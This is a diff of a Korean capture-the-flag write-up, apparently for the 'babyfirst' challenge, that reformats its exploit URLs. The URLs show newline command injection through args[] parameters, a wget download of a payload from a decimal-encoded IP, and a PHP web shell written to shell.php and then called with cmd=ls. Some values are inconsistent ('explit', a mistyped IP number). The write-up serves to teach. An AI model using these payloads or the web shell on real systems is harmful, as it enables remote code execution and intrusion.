@@ -58,13 +58,16 @@ touch 명령어로 파일 생성을 한번 해봅니다.
 
 .. code-block:: console
     
-    http://52.68.245.164/index.php?args[]=a%0a&args[]=touch&args[]=test
+    http://52.68.245.164/index.php?
+    args[]=a%0a&
+    args[]=touch&
+    args[]=test
 
     [실제 백엔드 동작]
     /bin/orange a%0a
     touch test
 
-.. image:: ../../_images/babyfirst-01_1.png
+.. image:: ../_images/babyfirst-01_1.png
     :align: center
 
 
@@ -97,7 +100,10 @@ wget으로 ip를 10진수 형식으로 변환해서 다운로드를 진행합니
 
 .. code-block:: console
 
-    http://52.68.245.164/index.php?args[]=a%0a&args[]=wget&args[]=3232235536
+    http://52.68.245.164/index.php?
+    args[]=a%0a&
+    args[]=wget&
+    args[]=3232235536
 
     [실제 백엔드 동작]
     /bin/orange a%0a
@@ -126,11 +132,26 @@ index.html
 
 .. code-block:: bash
     
-    <?phpfile_put_contents('shell.php', '    <?php    print shell_exec($_GET["cmd"]);    ?>');?>
+    <?
+    phpfile_put_contents('shell.php', '    <?php    print shell_exec($_GET["cmd"]);    ?>');
+    ?>
 
 .. code-block:: text
 
-    http://52.68.245.164/index.php?args[]=a%0a&args[]=mkdir&args[]=explit%0a&args[]=cd&args[]=exploit%0a&args[]=wget&args[]=32322355636%0a&args[]=tar&args[]=cvf&args[]=archived&args[]=exploit%0a&args[]=php&args[]=archived
+    http://52.68.245.164/index.php?
+    args[]=a%0a&
+    args[]=mkdir&
+    args[]=explit%0a&
+    args[]=cd&
+    args[]=exploit%0a&
+    args[]=wget&
+    args[]=32322355636%0a&
+    args[]=tar&
+    args[]=cvf&
+    args[]=archived&
+    args[]=exploit%0a&
+    args[]=php&
+    args[]=archived
 
     /bin/orange a%0a
     mkdir exploit%0a
@@ -146,3 +167,4 @@ index.html
 .. code-block:: bash
 
     http://52.68.245.164/sandbox/local_ip/shell.php?cmd=ls
+
